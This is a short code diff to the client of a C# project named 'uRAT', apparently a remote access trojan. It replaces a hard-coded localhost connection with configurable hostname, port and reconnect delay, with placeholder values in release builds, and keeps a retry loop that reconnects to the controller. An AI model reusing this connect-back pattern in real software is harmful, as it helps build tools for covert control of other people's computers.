@@ -13,9 +13,13 @@ namespace uRAT.Client
 {
     class Program
     {
+        private static string Hostname;
+        private static int Port;
+        private static int ReconnectDelay;
+
         static void Main(string[] args)
         {
-
+            InitializeSettings();
             Console.ReadLine();
             Globals.Client = new uNet2.UNetClient(new StandardPacketProcessor
             {
@@ -57,11 +61,24 @@ namespace uRAT.Client
             Console.ReadLine();
         }
 
+        static void InitializeSettings()
+        {
+#if DEBUG
+            Hostname = "127.0.0.1";
+            Port = 5599;
+            ReconnectDelay = 5000;
+#else
+            Hostname = "-";
+            Port = 0;
+            ReconnectDelay = 0;
+#endif
+        }
+
         static void Connect()
         {
-            if (!Globals.Client.Connect("127.0.0.1", 5599))
+            if (!Globals.Client.Connect(Hostname, Port))
             {
-                Thread.Sleep(5000);
+                Thread.Sleep(ReconnectDelay);
                 Connect();
             }
         }
